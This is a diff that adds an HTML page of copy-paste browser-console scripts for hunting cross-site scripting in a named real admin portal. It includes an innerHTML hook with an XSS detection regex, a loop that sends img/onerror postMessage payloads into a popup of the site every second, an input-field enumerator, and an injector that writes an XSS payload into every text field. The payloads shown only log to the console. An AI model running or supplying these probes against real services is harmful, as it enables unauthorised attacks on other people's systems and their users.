@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MNKD XSS Detector</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: #0d1117; color: #c9d1d9; min-height: 100vh; padding: 24px;
+  }
+  .container { max-width: 960px; margin: 0 auto; }
+  h1 { font-size: 22px; color: #fff; margin-bottom: 4px; }
+  .sub { color: #8b949e; font-size: 13px; margin-bottom: 24px; }
+  code { background: #161b22; padding: 2px 6px; border-radius: 4px; font-family: monospace; font-size: 12px; color: #f9e2af; }
+
+  .box {
+    background: #161b22; border: 1px solid #30363d; border-radius: 8px;
+    padding: 20px; margin-bottom: 16px;
+  }
+  .box h2 { font-size: 14px; color: #fff; margin-bottom: 12px; }
+
+  pre {
+    background: #0d1117; border: 1px solid #30363d; border-radius: 6px;
+    padding: 16px; overflow-x: auto; font-family: "SF Mono", Monaco, monospace;
+    font-size: 12px; line-height: 1.6; color: #c9d1d9; user-select: all;
+  }
+  .comment { color: #8b949e; }
+  .keyword { color: #ff7b72; }
+  .string { color: #a5d6ff; }
+  .func { color: #d2a8ff; }
+
+  .step { display: flex; gap: 12px; margin-bottom: 16px; align-items: flex-start; }
+  .step-num {
+    width: 28px; height: 28px; border-radius: 50%; background: #1f6feb;
+    color: #fff; display: flex; align-items: center; justify-content: center;
+    font-size: 13px; font-weight: bold; flex-shrink: 0; margin-top: 2px;
+  }
+  .step-text { font-size: 13px; line-height: 1.6; }
+
+  .btn {
+    display: inline-block; padding: 12px 24px; border-radius: 6px; font-size: 14px;
+    font-weight: 600; cursor: pointer; transition: all .2s; text-decoration: none;
+    margin-right: 8px; margin-bottom: 8px;
+  }
+  .btn-primary { background: #238636; color: #fff; border: none; }
+  .btn-primary:hover { background: #2ea043; }
+  .btn-copy { background: #1f6feb; color: #fff; border: none; }
+  .btn-copy:hover { background: #388bfd; }
+</style>
+</head>
+<body>
+<div class="container">
+
+<h1>&#128736; MNKD XSS Detector</h1>
+<p class="sub">
+  Copy the script below into MyAdmin's <strong>browser Console (F12)</strong>
+  while logged in. It will <strong>detect every sink</strong> where user data
+  reaches <code>innerHTML</code> or <code>| safe</code> pipe in real-time.
+</p>
+
+<!-- STEP 1: Detect innerHTML sinks -->
+<div class="box">
+  <h2>&#128064; Step 1: innerHTML Sink Detector</h2>
+  <p class="step-text" style="margin-bottom:12px">
+    Hook <code>innerHTML</code> setter globally. Every time any script sets
+    <code>element.innerHTML = something</code>, we log the element, the data,
+    and the stack trace.
+  </p>
+  <pre><span class="comment">// Copy this entire block → paste in MyAdmin Console → press Enter</span>
+<span class="keyword">const</span> _origInnerHTML = <span class="func">Object.getOwnPropertyDescriptor</span>(
+  Element.prototype, <span class="string">'innerHTML'</span>
+).set;
+
+<span class="keyword">const</span> _seen = <span class="keyword">new</span> <span class="func">WeakSet</span>();
+
+<span class="func">Object.defineProperty</span>(Element.prototype, <span class="string">'innerHTML'</span>, {
+  set: <span class="keyword">function</span>(value) {
+    <span class="comment">// Skip our own injections</span>
+    <span class="keyword">if</span> (value && <span class="keyword">typeof</span> value === <span class="string">'string'</span> && value.length &gt; 5) {
+      <span class="keyword">const</span> tag = <span class="keyword">this</span>.tagName || <span class="string">'?'</span>;
+      <span class="keyword">const</span> preview = value.substring(0, 120);
+      <span class="keyword">const</span> stack = <span class="keyword">new</span> <span class="func">Error</span>().stack.split(<span class="string">'\n'</span>).slice(1,5).join(<span class="string">' ← '</span>);
+
+      console.<span class="func">log</span>(
+        <span class="string">'%c[innerHTML] %c&lt;'</span> + tag + <span class="string">'&gt; %c'</span> + preview,
+        <span class="string">'color:#ff0;font-weight:bold'</span>,
+        <span class="string">'color:#0ff'</span>,
+        <span class="string">'color:#fff'</span>
+      );
+      console.<span class="func">log</span>(<span class="string">'%c  Stack: %c'</span> + stack, <span class="string">'color:#888'</span>, <span class="string">'color:#aaa'</span>);
+
+      <span class="comment">// Detect XSS payloads</span>
+      <span class="keyword">if</span> (/&lt;script|&lt;img|onerror=|onload=|javascript:|&lt;iframe|&lt;svg/i.test(value)) {
+        console.<span class="func">log</span>(
+          <span class="string">'%c[!] XSS VECTOR DETECTED in &lt;'</span> + tag + <span class="string">'&gt;!'</span>,
+          <span class="string">'color:red;font-size:16px;font-weight:bold'</span>
+        );
+        console.<span class="func">log</span>(<span class="string">'%c  Value: %c'</span> + value.substring(0, 200), <span class="string">'color:red'</span>, <span class="string">'color:#f88'</span>);
+      }
+    }
+    _origInnerHTML.<span class="func">call</span>(<span class="keyword">this</span>, value);
+  },
+  get: <span class="keyword">function</span>() {
+    <span class="keyword">return</span> _origInnerHTML.<span class="func">call</span>(<span class="keyword">this</span>);
+  },
+  configurable: <span class="keyword">true</span>
+});
+
+console.<span class="func">log</span>(<span class="string">'%c✓ innerHTML hook installed'</span>, <span class="string">'color:lime;font-weight:bold'</span>);
+console.<span class="func">log</span>(<span class="string">'%c  Now browse MyAdmin. Any innerHTML write will be logged.'</span>, <span class="string">'color:#aaa'</span>);
+console.<span class="func">log</span>(<span class="string">'%c  If you see [XSS VECTOR DETECTED] in red → you found a sink!'</span>, <span class="string">'color:#ff0'</span>);</pre>
+</div>
+
+<!-- STEP 2: Trigger notification hooks -->
+<div class="box">
+  <h2>&#128276; Step 2: Notification / Dialog Sink Tester</h2>
+  <p class="step-text" style="margin-bottom:12px">
+    After installing the innerHTML hook, browse MyAdmin and trigger these actions.
+    Each one may cause data to flow through the notification/dialog innerHTML sink.
+  </p>
+
+  <div class="step">
+    <div class="step-num">1</div>
+    <div class="step-text">
+      <strong>Trigger error toasts:</strong> Submit empty forms, enter invalid data,
+      cause API errors. Look for toast notifications — do they render HTML?
+    </div>
+  </div>
+  <div class="step">
+    <div class="step-num">2</div>
+    <div class="step-text">
+      <strong>Open modals/dialogs:</strong> Click "Delete", "Save", "Confirm" buttons.
+      Dialog messages go to <code>innerHTML</code> at line 179738.
+    </div>
+  </div>
+  <div class="step">
+    <div class="step-num">3</div>
+    <div class="step-text">
+      <strong>Check SignalR notifications:</strong> If the app has real-time updates
+      (report status changes, etc.), those messages flow via <code>innerHTML</code> too
+      (line 217020).
+    </div>
+  </div>
+  <div class="step">
+    <div class="step-num">4</div>
+    <div class="step-text">
+      <strong>Check user profile fields:</strong> Edit your profile — name, email signature,
+      any rich text fields. Save, then view. Does it render HTML?
+    </div>
+  </div>
+  <div class="step">
+    <div class="step-num">5</div>
+    <div class="step-text">
+      <strong>Help desk / Ticket system:</strong> Create a ticket. In every text field,
+      enter: <code>&lt;img src=x onerror=console.log('XSS')&gt;</code>
+      Then view the ticket. Does the image load?
+    </div>
+  </div>
+</div>
+
+<!-- STEP 3: Test postMessage to popup -->
+<div class="box">
+  <h2>&#128279; Step 3: postMessage Sink Tester</h2>
+  <p class="step-text" style="margin-bottom:12px">
+    Run this script from <strong>THIS page's console</strong> (not MyAdmin console)
+    after clicking "Verify My Session" on the main page.
+    It will send crafted postMessages into the MyAdmin popup to test if any
+    handler passes data to innerHTML.
+  </p>
+  <pre><span class="comment">// Run this in THIS page's console after MyAdmin popup is open:</span>
+<span class="keyword">const</span> popup = <span class="func">window.open</span>(<span class="string">'https://myadmin.geotab.com/home'</span>, <span class="string">'test'</span>, <span class="string">'width=1200,height=800'</span>);
+
+<span class="keyword">const</span> payloads = [
+  <span class="comment">// OIDC callback with XSS in URL</span>
+  { source: <span class="string">'oidc-client'</span>, url: <span class="string">'http://127.0.0.1/cb?code=x&state=&lt;img src=x onerror=console.log(1)&gt;'</span> },
+  <span class="comment">// Notification style</span>
+  { type: <span class="string">'SHOW'</span>, message: <span class="string">'&lt;img src=x onerror=console.log(1)&gt;'</span> },
+  <span class="comment">// Generic</span>
+  { action: <span class="string">'UPDATE'</span>, data: { msg: <span class="string">'&lt;img src=x onerror=console.log(1)&gt;'</span> } },
+];
+
+<span class="func">setInterval</span>(() =&gt; {
+  payloads.<span class="func">forEach</span>(p =&gt; {
+    <span class="keyword">try</span> { popup.<span class="func">postMessage</span>(p, <span class="string">'https://myadmin.geotab.com'</span>); } <span class="keyword">catch</span>(e) {}
+    <span class="keyword">try</span> { popup.<span class="func">postMessage</span>(p, <span class="string">'*'</span>); } <span class="keyword">catch</span>(e) {}
+  });
+}, 1000);
+
+console.<span class="func">log</span>(<span class="string">'%c✓ Sending postMessage probes every 1s'</span>, <span class="string">'color:lime'</span>);
+console.<span class="func">log</span>(<span class="string">'%c  Watch MyAdmin popup console for [innerHTML] logs'</span>, <span class="string">'color:#aaa'</span>);</pre>
+</div>
+
+<!-- STEP 4: Stored XSS input finder -->
+<div class="box">
+  <h2>&#128269; Step 4: Stored XSS Input Finder</h2>
+  <p class="step-text" style="margin-bottom:12px">
+    Run this in <strong>MyAdmin Console</strong> to find ALL input fields that might
+    store data rendered via innerHTML.
+  </p>
+  <pre><span class="comment">// Run in MyAdmin Console to find all form inputs:</span>
+<span class="keyword">const</span> inputs = document.<span class="func">querySelectorAll</span>(<span class="string">'input[type="text"], input:not([type]), textarea, [contenteditable]'</span>);
+console.<span class="func">table</span>(
+  [...inputs].<span class="func">map</span>(el =&gt; ({
+    tag: el.tagName,
+    name: el.name || el.getAttribute(<span class="string">'formcontrolname'</span>) || <span class="string">'-'</span>,
+    type: el.type || <span class="string">'text'</span>,
+    placeholder: (el.placeholder || <span class="string">''</span>).substring(0, 40),
+    id: el.id || <span class="string">'-'</span>,
+    form: el.closest(<span class="string">'form'</span>)?.getAttribute(<span class="string">'ng-reflect-form'</span>) || el.closest(<span class="string">'form'</span>)?.action || <span class="string">'no-form'</span>,
+  }))
+);
+console.<span class="func">log</span>(<span class="string">'%c↑ %cThese are input fields. Test each one with HTML payload.'</span>,
+  <span class="string">'color:#ff0'</span>, <span class="string">'color:#aaa'</span>);</pre>
+</div>
+
+<!-- STEP 5: automated form filler -->
+<div class="box">
+  <h2>&#9889; Step 5: Automated XSS Payload Injector</h2>
+  <p class="step-text" style="margin-bottom:12px">
+    <strong>WARNING:</strong> This will inject XSS test payloads into ALL text fields
+    on the current page. Only run this on pages where you want to test.
+    <br><br>
+    After running, submit each form and check if the payload renders as HTML.
+  </p>
+  <pre><span class="comment">// Run in MyAdmin Console — injects test payload into every text field</span>
+<span class="keyword">const</span> test = <span class="string">'&lt;img src=x onerror="console.log(\'XSS_WORKS_\'+document.location.pathname)"&gt;'</span>;
+<span class="keyword">const</span> fields = document.<span class="func">querySelectorAll</span>(
+  <span class="string">'input[type="text"], input:not([type]), textarea, [contenteditable="true"]'</span>
+);
+console.<span class="func">log</span>(<span class="string">'%cInjecting XSS test payload into '</span> + fields.length + <span class="string">' fields...'</span>, <span class="string">'color:#ff0'</span>);
+fields.<span class="func">forEach</span>((el, i) =&gt; {
+  <span class="keyword">if</span> (el.contentEditable === <span class="string">'true'</span>) {
+    el.innerHTML = test;
+  } <span class="keyword">else</span> {
+    <span class="comment">// Use native setter to trigger Angular's change detection</span>
+    <span class="keyword">const</span> nativeSetter = <span class="func">Object.getOwnPropertyDescriptor</span>(
+      HTMLInputElement.prototype, <span class="string">'value'</span>
+    ).set || <span class="func">Object.getOwnPropertyDescriptor</span>(
+      HTMLTextAreaElement.prototype, <span class="string">'value'</span>
+    ).set;
+    <span class="keyword">if</span> (nativeSetter) {
+      nativeSetter.<span class="func">call</span>(el, test);
+    } <span class="keyword">else</span> {
+      el.value = test;
+    }
+    el.<span class="func">dispatchEvent</span>(<span class="keyword">new</span> <span class="func">Event</span>(<span class="string">'input'</span>, { bubbles: <span class="keyword">true</span> }));
+    el.<span class="func">dispatchEvent</span>(<span class="keyword">new</span> <span class="func">Event</span>(<span class="string">'change'</span>, { bubbles: <span class="keyword">true</span> }));
+  }
+  console.<span class="func">log</span>(<span class="string">'  [✓] '</span> + (el.name || el.id || el.tagName) + <span class="string">' ← payload injected'</span>);
+});
+
+console.<span class="func">log</span>(<span class="string">'%c✓ All '</span> + fields.length + <span class="string">' fields injected'</span>, <span class="string">'color:lime;font-weight:bold'</span>);
+console.<span class="func">log</span>(<span class="string">'%c  Now SUBMIT the form. If you see "XSS_WORKS_" in console → XSS confirmed!'</span>, <span class="string">'color:#ff0;font-size:14px'</span>);</pre>
+</div>
+
+</div>
+</body>
+</html>
